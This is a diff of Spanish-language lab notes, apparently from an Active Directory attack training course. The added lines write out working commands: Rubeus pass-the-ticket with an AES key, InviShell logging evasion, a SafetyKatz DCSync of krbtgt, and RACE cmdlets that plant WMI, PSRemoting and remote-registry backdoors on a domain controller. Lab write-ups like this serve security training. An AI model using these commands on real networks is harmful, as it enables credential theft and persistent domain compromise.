@@ -1040,8 +1040,13 @@ C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "e
 Modificar los descriptores de seguridad en *dcorp-dc* para obtener acceso mediante el control remoto de PowerShell y WMI sin necesidad de acceso de administrador.
 
 Para poder llevar a acabo esta modificacion una vez que tenemos privilegios administrativos en una maquina podemos modificar los descriptores de seguridad de los servicios para poder acceder a estos sin privilegios administrativos.
-Priemro debere
-Primero deveremos de wjwcutar una *InviShell*
+Priemro deberemos de abrir una nueva pestaña como *Administrador*, creandose una nueva CMD
+```shell
+[studnet97]
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /createnetonly:C:\Windows\System32\cmd.exe /ptt
+```
+
+En esa ventana deberemos ejecutar una *InviShell*
 ```shell
 [student97]
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -1052,6 +1057,13 @@ Cargar el modulo *RACE*
 [studnet97]
 . C:\AD\Tools\RACE.ps1
 ```
+
+```shell
+Set-RemoteWMI -SamAccountName student867 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Set-RemotePSRemoting -SamAccountName student867 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student867 -Verbose
+```
+
 
 Y a continuacion modificaremso los descriptores de seguridad del host para *WMI* en el *DC* para permitir el acceso de estudiante a *WMI*
 ```shell
